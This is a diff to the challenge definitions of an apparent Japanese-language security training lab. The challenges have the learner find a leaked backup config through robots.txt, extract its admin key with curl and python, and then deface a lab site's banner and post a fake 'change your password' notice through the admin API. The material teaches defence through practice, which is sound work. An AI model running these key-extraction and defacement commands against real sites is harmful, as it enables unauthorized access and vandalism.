@@ -56,19 +56,19 @@ const challengeGroups: ChallengeGroup[] = [
       {
         id: '01', title: '公開バックアップを見つける',
         goal: '`robots.txt` を調べ、公開されてしまったバックアップ設定から管理APIと管理キーを特定してください。',
-        commands: ["curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/robots.txt", "curl -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/backup/config.json"],
-        hint: '`Disallow` は検索エンジンへのお願いで、アクセス制御ではありません。表示されたJSONの `adminApi` と `adminKey` を確認します。',
+        commands: ["curl -i -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/robots.txt", "curl -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/backup/config.json", "export TRAINING_ADMIN_KEY=$(curl -fsS -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" http://target:3000/backup/config.json | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"adminKey\"])')"],
+        hint: '`Disallow` は検索エンジンへのお願いで、アクセス制御ではありません。表示されたJSONの `adminApi` と `adminKey` を確認し、3つ目のコマンドで取得した演習専用キーを `TRAINING_ADMIN_KEY` に保存します。',
         result: '設定JSONから管理APIのパスと管理キーを確認できれば次へ進めます。',
       },
       {
         id: '02', title: '管理APIで表示を変更する', goal: '漏えいした管理キーを使い、管理APIでTarget 1の見出しとテーマを変更してください。',
-        commands: ["curl -X POST http://target:3000/api/admin/banner -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"headline\":\"研修サイトは改ざんされました\",\"theme\":\"compromised\"}'"],
+        commands: ["curl -X POST http://target:3000/api/admin/banner -H 'Content-Type: application/json' -H \"X-Admin-Key: $TRAINING_ADMIN_KEY\" -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"headline\":\"研修サイトは改ざんされました\",\"theme\":\"compromised\"}'"],
         hint: 'JSONを送るので `Content-Type` を指定し、認証値は `X-Admin-Key` ヘッダーへ入れます。',
         result: '左下のサイトが赤い警告テーマへ変われば、改ざん条件の一部を満たしています。',
       },
       {
         id: '03', title: '警告メッセージを追加する', goal: '同じ管理キーで通知APIを呼び、トップページへ任意の警告メッセージを追加してください。',
-        commands: ["curl -X POST http://target:3000/api/admin/notice -H 'Content-Type: application/json' -H 'X-Admin-Key: training-admin-2026' -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"notice\":\"直ちにパスワードを変更してください\"}'"],
+        commands: ["curl -X POST http://target:3000/api/admin/notice -H 'Content-Type: application/json' -H \"X-Admin-Key: $TRAINING_ADMIN_KEY\" -H \"X-TerminalBox-Session: $TERMINALBOX_SESSION_ID\" -d '{\"notice\":\"直ちにパスワードを変更してください\"}'"],
         hint: '管理APIで更新できる項目が多いほど、キー漏えい時の影響も広がります。',
         result: 'トップページに赤い警告メッセージが追加されれば成功です。',
       },
